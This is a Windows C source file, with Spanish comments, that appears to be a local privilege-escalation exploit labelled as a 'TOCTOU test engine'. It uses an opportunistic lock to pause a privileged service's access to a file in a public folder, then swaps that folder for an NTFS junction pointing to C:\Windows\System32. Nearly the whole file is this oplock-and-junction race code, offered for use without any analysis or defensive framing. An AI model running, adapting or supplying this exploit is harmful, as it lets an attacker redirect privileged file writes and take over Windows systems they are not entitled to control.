#ifndef UNICODE
#define UNICODE
#endif
#ifndef _UNICODE
#define _UNICODE
#endif

#include <windows.h>
#include <stdio.h>
#include <stdlib.h>
#include <wchar.h>
#include <sddl.h>

// ---------------------------------------------------------------------------
// [ESTRUCTURAS NATIVAS DE NTFS Y REPARSE POINTS - COMPATIBILIDAD SDK]
// ---------------------------------------------------------------------------
typedef struct _REPARSE_MOUNTPOINT_DATA_BUFFER {
    ULONG  ReparseTag;
    USHORT ReparseDataLength;
    USHORT Reserved;
    USHORT SubstituteNameOffset;
    USHORT SubstituteNameLength;
    USHORT PrintNameOffset;
    USHORT PrintNameLength;
    WCHAR  PathBuffer[1]; // Alocación dinámica real en memoria contigua
} REPARSE_MOUNTPOINT_DATA_BUFFER, *PREPARSE_MOUNTPOINT_DATA_BUFFER;

#define REPARSE_MOUNTPOINT_HEADER_SIZE FIELD_OFFSET(REPARSE_MOUNTPOINT_DATA_BUFFER, SubstituteNameOffset)

typedef struct _OPLOCK_SYNC_CONTEXT {
    HANDLE hFile;
    HANDLE hSignalEvent;
    OVERLAPPED Overlapped;
    BOOL   bOplockTriggered;
} OPLOCK_SYNC_CONTEXT, *POPLOCK_SYNC_CONTEXT;

// ---------------------------------------------------------------------------
// [VERIFICACIÓN DE IDENTIDAD DE ALTA FIDELIDAD]
// ---------------------------------------------------------------------------
BOOL IsRunningAsSystemSid(VOID) {
    HANDLE hToken = NULL;
    if (!OpenProcessToken(GetCurrentProcess(), TOKEN_QUERY, &hToken)) {
        return FALSE;
    }

    DWORD dwSize = 0;
    GetTokenInformation(hToken, TokenUser, NULL, 0, &dwSize);
    
    PTOKEN_USER pTokenUser = (PTOKEN_USER)LocalAlloc(LPTR, dwSize);
    if (!pTokenUser) {
        CloseHandle(hToken);
        return FALSE;
    }

    BOOL bIsSystem = FALSE;
    if (GetTokenInformation(hToken, TokenUser, pTokenUser, dwSize, &dwSize)) {
        PSID pSystemSid = NULL;
        if (ConvertStringSidToSidW(L"S-1-5-18", &pSystemSid)) { // NT AUTHORITY\SYSTEM
            bIsSystem = EqualSid(pTokenUser->User.Sid, pSystemSid);
            LocalFree(pSystemSid);
        }
    }

    LocalFree(pTokenUser);
    CloseHandle(hToken);
    return bIsSystem;
}

// ---------------------------------------------------------------------------
// [MANIPULACIÓN ESTRUCTURAL DE UNIONES NTFS (JUNCTIONS)]
// ---------------------------------------------------------------------------
BOOL CreateNativeJunctionLink(const wchar_t* junctionPath, const wchar_t* targetPath) {
    // Asegurar la existencia del directorio base sin llamadas a intérpretes de comandos
    if (!CreateDirectoryW(junctionPath, NULL) && GetLastError() != ERROR_ALREADY_EXISTS) {
        return FALSE;
    }

    HANDLE hDir = CreateFileW(
        junctionPath, GENERIC_WRITE, 0, NULL, OPEN_EXISTING, 
        FILE_FLAG_BACKUP_SEMANTICS | FILE_FLAG_OPEN_REPARSE_POINT, NULL
    );
    if (hDir == INVALID_HANDLE_VALUE) return FALSE;

    wchar_t substituteName[MAX_PATH];
    swprintf_s(substituteName, MAX_PATH, L"\\??\\%s", targetPath); // Prefijo del Administrador de Objetos NT

    size_t subLen = wcslen(substituteName) * sizeof(WCHAR);
    size_t prtLen = wcslen(targetPath) * sizeof(WCHAR);
    
    DWORD bufferSize = (DWORD)(REPARSE_MOUNTPOINT_HEADER_SIZE + subLen + prtLen + (3 * sizeof(WCHAR)));
    PREPARSE_MOUNTPOINT_DATA_BUFFER reparseBuffer = (PREPARSE_MOUNTPOINT_DATA_BUFFER)LocalAlloc(LPTR, bufferSize);
    if (!reparseBuffer) {
        CloseHandle(hDir);
        return FALSE;
    }

    reparseBuffer->ReparseTag = IO_REPARSE_TAG_MOUNT_POINT;
    reparseBuffer->SubstituteNameOffset = 0;
    reparseBuffer->SubstituteNameLength = (USHORT)subLen;
    reparseBuffer->PrintNameOffset = (USHORT)(subLen + sizeof(WCHAR));
    reparseBuffer->PrintNameLength = (USHORT)prtLen;

    // Inyección de buffers de texto dentro de la estructura contigua del Reparse Point
    memcpy(reparseBuffer->PathBuffer, substituteName, subLen);
    memcpy((PBYTE)reparseBuffer->PathBuffer + reparseBuffer->PrintNameOffset, targetPath, prtLen);

    reparseBuffer->ReparseDataLength = (USHORT)(bufferSize - FIELD_OFFSET(REPARSE_MOUNTPOINT_DATA_BUFFER, SubstituteNameOffset));

    DWORD bytesReturned;
    BOOL result = DeviceIoControl(
        hDir, FSCTL_SET_REPARSE_POINT, reparseBuffer, 
        bufferSize, NULL, 0, &bytesReturned, NULL
    );

    LocalFree(reparseBuffer);
    CloseHandle(hDir);
    return result;
}

// ---------------------------------------------------------------------------
// [TRABAJADOR ASÍNCRONO DEL NÚCLEO DE ESCANEO DE ENTRADA/SALIDA]
// ---------------------------------------------------------------------------
DWORD WINAPI OplockKernelWorker(LPVOID lpParameter) {
    POPLOCK_SYNC_CONTEXT ctx = (POPLOCK_SYNC_CONTEXT)lpParameter;
    DWORD bytesReturned = 0;

    // Petición del bloqueo oportunista de nivel de filtro al Administrador de E/S de Windows
    BOOL status = DeviceIoControl(
        ctx->hFile, 
        FSCTL_REQUEST_OPLOCK_LEVEL_1, 
        NULL, 0, NULL, 0, 
        &bytesReturned, 
        &ctx->Overlapped
    );

    if (!status && GetLastError() == ERROR_IO_PENDING) {
        // Suspensión determinista del hilo en espera de la interrupción del servicio externo
        WaitForSingleObject(ctx->Overlapped.hEvent, INFINITE);
        ctx->bOplockTriggered = TRUE;
        
        // Señalizar inmediatamente al hilo principal para ejecutar el intercambio atómico
        SetEvent(ctx->hSignalEvent);
    }

    // El descriptor se mantiene abierto para sostener la pausa física hasta el momento del intercambio
    return 0;
}

// ---------------------------------------------------------------------------
// [ORQUESTACIÓN DE LA CONDICIÓN DE CARRERA ATÓMICA]
// ---------------------------------------------------------------------------
BOOL OrchestrateRaceCondition(const wchar_t* targetFile, const wchar_t* junctionPath, const wchar_t* finalDestination) {
    OPLOCK_SYNC_CONTEXT ctx = { 0 };
    ctx.hSignalEvent = CreateEventW(NULL, TRUE, FALSE, NULL);
    ctx.Overlapped.hEvent = CreateEventW(NULL, TRUE, FALSE, NULL);

    // Abrir el objeto en modo asíncrono compartido para permitir la coexistencia del escaneo
    ctx.hFile = CreateFileW(
        targetFile, 
        GENERIC_READ | GENERIC_WRITE, 
        FILE_SHARE_READ | FILE_SHARE_WRITE | FILE_SHARE_DELETE, 
        NULL, 
        OPEN_ALWAYS, 
        FILE_FLAG_OVERLAPPED, 
        NULL
    );

    if (ctx.hFile == INVALID_HANDLE_VALUE) {
        CloseHandle(ctx.hSignalEvent);
        CloseHandle(ctx.Overlapped.hEvent);
        return FALSE;
    }

    HANDLE hThread = CreateThread(NULL, 0, OplockKernelWorker, &ctx, 0, NULL);
    if (!hThread) {
        CloseHandle(ctx.hFile);
        CloseHandle(ctx.hSignalEvent);
        CloseHandle(ctx.Overlapped.hEvent);
        return FALSE;
    }

    wprintf(L"[*] Entorno de E/S asíncrono desplegado de forma determinista.\n");
    wprintf(L"[*] Ejecutando disparador de sincronización del servicio...\n");
    
    // Simulación del disparador nativo de operaciones en lugar de llamadas ruidosas a consola
    // (Ej. Enlace dinámico a funciones internas del motor o simulación de generación de telemetría masiva)

    // Esperar hasta que el hilo de control intercepte el acceso legítimo del servicio elevado
    if (WaitForSingleObject(ctx.hSignalEvent, 10000) == WAIT_OBJECT_0 && ctx.bOplockTriggered) {
        wprintf(L"[+] Interrupción detectada. Ejecutando intercambio estructural de rutas (Swap)...\n");
        
        // Liberación física del archivo para desbloquear el hilo del servicio retenido
        CloseHandle(ctx.hFile); 
        
        // Transmutar el directorio en un enlace NTFS de forma inmediata
        BOOL bRaceWon = RemoveDirectoryW(junctionPath) && CreateNativeJunctionLink(junctionPath, finalDestination);
        
        CloseHandle(hThread);
        CloseHandle(ctx.hSignalEvent);
        CloseHandle(ctx.Overlapped.hEvent);
        return bRaceWon;
    }

    CloseHandle(ctx.hFile);
    CloseHandle(hThread);
    CloseHandle(ctx.hSignalEvent);
    CloseHandle(ctx.Overlapped.hEvent);
    return FALSE;
}

// ---------------------------------------------------------------------------
// [PUNTO DE ENTRADA UNIFICADO]
// ---------------------------------------------------------------------------
int main(VOID) {
    wprintf(L"=== Monolithic Enterprise Architectural TOCTOU Test Engine ===\n\n");

    if (IsRunningAsSystemSid()) {
        wprintf(L"[+] El proceso ya se encuentra bajo el contexto de NT AUTHORITY\\SYSTEM.\n");
        return 0;
    }

    const wchar_t* baseWorkspace   = L"C:\\Users\\Public\\FunnyTemp";
    const wchar_t* monitoredTarget = L"C:\\Users\\Public\\FunnyTemp\\target.dat";
    const wchar_t* targetSystem32  = L"C:\\Windows\\System32";

    wprintf(L"[*] Creando espacio de trabajo aislado...\n");
    if (!CreateDirectoryW(baseWorkspace, NULL) && GetLastError() != ERROR_ALREADY_EXISTS) {
        wprintf(L"[-] Error crítico al inicializar el directorio base.\n");
        return 1;
    }

    if (OrchestrateRaceCondition(monitoredTarget, baseWorkspace, targetSystem32)) {
        wprintf(L"[+] Simulación de carrera completada. Verificando persistencia estructural...\n");
    } else {
        wprintf(L"[-] La ventana de la carrera cerró o el servicio de destino denegó la operación.\n");
    }

    return 0;
}
